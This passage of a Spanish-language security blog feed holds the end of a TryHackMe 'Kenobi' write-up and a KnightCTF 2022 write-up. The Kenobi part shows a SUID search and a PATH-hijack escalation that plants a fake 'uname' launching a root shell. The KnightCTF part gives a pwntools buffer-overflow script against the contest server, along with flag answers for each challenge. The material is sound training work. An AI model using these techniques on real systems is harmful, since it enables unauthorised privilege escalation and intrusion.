&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find / &lt;span class=&quot;nt&quot;&gt;-uid&lt;/span&gt; 0 &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La forma más sencilla para abusar de algún binario con permisos mal asignados sería recurrir a &lt;a href=&quot;https://gtfobins.github.io/&quot;&gt;GTFOBins&lt;/a&gt;, sin embargo, el binario que llama nuestra atención no es propio del sistema, por lo que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GTFOBins&lt;/code&gt;, no nos será de utilidad.&lt;/p&gt;

&lt;p&gt;Si comprobamos en nuestra máquina de atacantes, no existe ningún binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/menu&lt;/code&gt;, por lo que este debe haber sido creado, de modo que puede tener alguna falla de seguridad, vamos a revisarlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que el binario es lo que dice ser, un menú que nos presenta tres únicas posibilidades, vamos a echar un vistazo más a fondo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings /usr/bin/menu
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar los binarios que utiliza este menú dependiendo de la opción que seleccionemos, lo más interesante aquí es que no se está empleando la ruta completa de estos comandos, tan solo se los está mencionando, por lo que, al no hacer esta verificación, podemos suplantarlos.&lt;/p&gt;

&lt;p&gt;Antes de que el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/menu&lt;/code&gt; encuentre los binarios legítimos dentro de la variable de entorno &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt;, nosotros añadiremos nuestros propios binarios en el inicio, los cuales serán igual en nombre, pero ejecutarán el código que nos interese, en este caso una consola con máximos privilegios.&lt;/p&gt;

&lt;p&gt;Este proceso podemos realizarlo para cualquiera de los tres binarios, &lt;em&gt;curl&lt;/em&gt;, &lt;em&gt;uname&lt;/em&gt; o &lt;em&gt;ifconfig&lt;/em&gt;, eso si, debemos de encontrarnos en una ruta donde tengamos permisos de escritura, el directorio del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kenobi&lt;/code&gt;, o la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; por ejemplo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;uname
export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/home/kenobi:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;uname&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-02-07-Kenobi-TryHackMe/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Mon, 07 Feb 2022 00:00:00 -0500</pubDate>
        <link>/es/Kenobi-TryHackMe/</link>
        <guid isPermaLink="true">/es/Kenobi-TryHackMe/</guid>
      </item>
    
      <item>
        <title>KnightCTF 2022</title>
        <description>&lt;p&gt;KnightCTF 2022, es el primer &lt;em&gt;capture the flag&lt;/em&gt; organizado por &lt;a href=&quot;https://knightsquad.org/&quot;&gt;Knight Squad&lt;/a&gt;, este es de tipo &lt;em&gt;jeopardy&lt;/em&gt;, por lo que encontraremos distintas categorías.&lt;/p&gt;

&lt;div style=&quot;text-align:center&quot;&gt;
  &lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/1.png&quot; alt=&quot;KnightCTF logo&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;
&lt;/div&gt;

&lt;h3 id=&quot;reverse-engineering&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Reverse Engineering&lt;/h3&gt;

&lt;h4 id=&quot;the-encoder&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Encoder&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/2.png&quot; alt=&quot;2&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al extraer y ejecutar el binario, &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/the_encoder.zip&quot;&gt;the_encoder.out&lt;/a&gt;, vamos a darnos cuenta que nos pregunta por una cadena de caracteres; si introducimos cualquier carácter, el binario nos devolverá un valor bastante similar a los que encontramos en el enunciado del reto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/3.png&quot; alt=&quot;3&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Por otra parte, podemos darnos cuenta que si introducimos caracteres consecutivos, el valor que nos devuelve también lo es, esto ya nos da una posible idea de por donde van los tiros.&lt;/p&gt;

&lt;p&gt;Podemos consultar una &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/4.png&quot;&gt;tabla de código ASCII&lt;/a&gt;, para saber en que orden van los caracteres, y así simplificar las cosas.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/5.png&quot; alt=&quot;5&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{s1Mpl3_3Nc0D3r_1337}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;pwn&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;PWN&lt;/h3&gt;

&lt;h4 id=&quot;whats-your-name&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;What’s Your Name&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/6.png&quot; alt=&quot;6&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al extraer y ejecutar el binario, &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/whats_your_name.zip&quot;&gt;whats_your_name&lt;/a&gt;, vamos a darnos cuenta que nos pregunta por un nombre; si introducimos cualquier cadena de caracteres, el binario nos devolverá un mensaje de bienvenida.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/7.png&quot; alt=&quot;7&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si introducimos una cadena de caracteres lo suficientemente larga, conseguiremos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Segmentation Fault&lt;/code&gt;, lo cual nos da la idea de un posible &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Buffer Overflow&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/8.png&quot; alt=&quot;8&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos empezar a depurar el binario con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GEF&lt;/code&gt;, tal y como lo hicimos en la máquina &lt;a href=&quot;https://mateonitro550.github.io/Safe-Hack-The-Box&quot;&gt;Safe&lt;/a&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;, y nos daremos cuenta que el &lt;em&gt;buffer&lt;/em&gt; tiene una longitud de &lt;em&gt;72 bytes&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/9.png&quot; alt=&quot;9&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con esto en mente, podemos analizar el binario con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Ghidra&lt;/code&gt;, y nos daremos cuenta que dentro de la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt;, después de hacer una serie de validaciones, se está efectuando una llamada al sistema para ejecutar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; al archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/hacker/flag.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De modo que teniendo control sobre el registro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RIP&lt;/code&gt;, si apuntamos a la dirección de la llamada al sistema, omitiremos toda la validación y conseguiremos listar la flag; para ello, haremos un script en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Python&lt;/code&gt;, bastante parecido al de la máquina &lt;a href=&quot;https://mateonitro550.github.io/Safe-Hack-The-Box&quot;&gt;Safe&lt;/a&gt; de &lt;em&gt;Hack The Box&lt;/em&gt;.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;198.211.115.81&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4011d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{bAbY_bUfF3r_0v3Rf1Ow}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;osint&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;OSINT&lt;/h3&gt;

&lt;h4 id=&quot;canada-server&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Canada Server&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{192.99.167.83}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;find-the-camera&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Find The Camera&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez descargamos el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Bus.png&quot;&gt;archivo adjunto&lt;/a&gt;, vamos a darnos cuenta que los derechos de autor le pertenecen a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JenCh012&lt;/code&gt;, así que procedemos a buscarlo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ambas fotografías curiosamente pertenecen al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JenCh012&lt;/code&gt;, por lo que haremos clic en la fotografía que nos interesa.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{SONY_DSC_S&amp;amp;980}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;steganography&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Steganography&lt;/h3&gt;

&lt;h4 id=&quot;follow-the-white-rabbit&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Follow The White Rabbit&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez descargado el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/whiterabbit.jpg&quot;&gt;archivo adjunto&lt;/a&gt;, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;código morse&lt;/code&gt;. Para decodificarlo, podemos usar herramientas como &lt;a href=&quot;https://www.dcode.fr/codigo-morse&quot;&gt;dcode&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{L0OKB4Y0UL34P}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;follow&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Follow&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Cuando empezamos a analizar el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Follow.pdf&quot;&gt;archivo PDF&lt;/a&gt; adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí.&lt;/p&gt;

&lt;div style=&quot;text-align:center&quot;&gt;
  &lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;
&lt;/div&gt;

&lt;p&gt;De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{This_is_the_real_flag}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;qr-code-from-the-future&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;QR Code From The Future&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Al abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/QR_Code_From_The_Future.gif&quot;&gt;archivo adjunto&lt;/a&gt;, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los &lt;em&gt;frames&lt;/em&gt; que componen este &lt;em&gt;GIF&lt;/em&gt;, para ello podemos hacer uso de &lt;a href=&quot;https://ezgif.com/split&quot;&gt;Ezgif&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Una vez hemos conseguido los &lt;em&gt;48 códigos QR&lt;/em&gt; que componen el &lt;em&gt;GIF&lt;/em&gt;, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zbarimg&lt;/code&gt;, por lo que deberemos de tener descargados todos los &lt;em&gt;códigos QR&lt;/em&gt;. En caso de no contar con la herramienta descargada podemos hacer lo siguiente:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install zbar-tools
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zbarimg * | cut -d &quot;:&quot; -f2 | tr -d &quot;\n&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez escaneados los &lt;em&gt;48 código QR&lt;/em&gt; conseguiremos la siguiente cadena de caracteres:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;}pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zbarimg * | cut -d &quot;:&quot; -f2 | tac | tr -d &quot;\n&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La cadena, está encriptada por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROT13&lt;/code&gt;, por lo que al &lt;a href=&quot;https://rot13.com/&quot;&gt;decodificarla&lt;/a&gt;, conseguiremos la flag:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{QR_code_got_evolved_from_static_to_dynamic}
